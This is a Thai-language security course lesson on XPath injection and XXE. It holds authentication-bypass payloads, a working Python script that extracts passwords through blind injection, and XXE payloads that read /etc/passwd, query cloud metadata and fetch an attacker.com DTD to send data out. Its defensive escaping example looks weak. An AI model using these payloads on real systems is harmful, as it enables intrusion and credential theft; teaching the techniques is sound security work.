# Part 038: XML และ XPath Injection

## ภาพรวม

XPath injection เป็นเทคนิคที่คล้ายกับ SQL injection แต่เป็นการโจมตี XPath queries ใน XML databases

**ขั้นตอนที่ 576-590**

---

## 576. XPath พื้นฐาน

```xml
<!-- ตัวอย่าง XML -->
<?xml version="1.0"?>
<users>
  <user id="1">
    <username>admin</username>
    <password>secret123</password>
    <role>admin</role>
  </user>
  <user id="2">
    <username>john</username>
    <password>pass456</password>
    <role>user</role>
  </user>
</users>
```

```
XPath queries:
/users/user[username='admin']         -- find admin user
/users/user[1]                        -- first user
/users/user/@id                       -- get id attribute
/users/user/password                  -- get all passwords
```

---

## 577. XPath Injection Authentication Bypass

```xml
<!-- PHP code vulnerable to XPath injection -->
<!-- $query = "//users/user[username='$username' and password='$password']" -->
```

```
เหมือน SQL injection:
username: admin' or '1'='1
password: anything

Query กลายเป็น:
//users/user[username='admin' or '1'='1' and password='anything']
-- '1'='1' = true ทำให้ bypass ได้

Payloads:
username: ' or '1'='1
username: admin' or '1'='1' or 'a'='a
username: ' or 1=1 or ''='
username: admin']%00  (null byte truncation)
```

---

## 578. XPath Blind Injection

```
สุ่ม characters ทีละตัว

username: ' or substring(password,1,1)='a
username: ' or substring(password,1,1)='b
...
username: ' or substring(password,1,1)='s'  -- found!
```

```python
import requests

def xpath_blind_extract(url, param, xpath_query):
    """Extract data via XPath blind injection"""
    result = ""
    
    # หา length
    length = 0
    for i in range(1, 100):
        payload = f"' or string-length({xpath_query})={i} or ''='"
        r = requests.post(url, data={param: payload})
        if 'success' in r.text.lower() or len(r.text) > 500:
            length = i
            break
    
    # Extract characters
    for pos in range(1, length + 1):
        for c in 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#':
            payload = f"' or substring({xpath_query},{pos},1)='{c}' or ''='"
            r = requests.post(url, data={param: payload})
            if 'success' in r.text.lower() or len(r.text) > 500:
                result += c
                break
    
    return result

# Usage
password = xpath_blind_extract(
    url='http://example.com/login',
    param='username',
    xpath_query="//users/user[1]/password"
)
print(f"Password: {password}")
```

---

## 579. XXE (XML External Entity) Injection

```xml
<!-- XXE payload อ่านไฟล์ -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<search><query>&xxe;</query></search>

<!-- SSRF through XXE -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<search><query>&xxe;</query></search>

<!-- Blind XXE via DNS/HTTP -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<search><query>&exfil;</query></search>
```

---

## 580. การป้องกัน XPath Injection

```php
<?php
// VULNERABLE
$query = "//users/user[username='$_POST[username]' and password='$_POST[password]']";

// SECURE - Escape special chars
function escapeXPath($val) {
    return str_replace(["'", '"'], ["&apos;", '&quot;'], $val);
}

$username = escapeXPath($_POST['username']);
$password = escapeXPath($_POST['password']);
$query = "//users/user[username='$username' and password='$password']";

// BETTER - Parameterized XPath (language dependent)
// Java: XPath.compile with variables
// Python: lxml with variables
```

---

## สรุป

XPath Injection:
- **คล้าย SQL injection** แต่กับ XML data
- **Auth bypass** - or '1'='1'
- **Blind extraction** - substring()
- **XXE** - อ่านไฟล์/SSRF

---

*Part 038 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
